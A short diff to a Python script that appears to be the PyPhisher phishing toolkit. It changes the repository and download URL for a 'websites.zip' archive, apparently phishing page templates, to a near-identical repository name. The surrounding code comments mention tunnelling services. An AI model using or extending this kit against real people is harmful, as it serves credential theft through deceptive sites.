@@ -222,8 +222,8 @@ cprint = Console().print
 # Get Columns of Screen
 columns = get_terminal_size().columns
 
-repo_url = "https://github.com/UnknowMyReach/pyphisher/"
-websites_url = f"{repo_url}/releases/download/v{version}/websites.zip" # "https://github.com/UnknowMyReach/pyphisher/releases/download/1.1.2/websites.rar" 
+repo_url = "https://github.com/UnknowMyReach/pyphisherr/"
+websites_url = f"{repo_url}/releases/download/v{version}/websites.zip" # "https://github.com/UnknowMyReach/pyphisherr/releases/download/1.1.2/websites.rar" 
 
 # CF = Cloudflared, NR = Ngrok, LX = LocalXpose, LHR = LocalHostRun
 
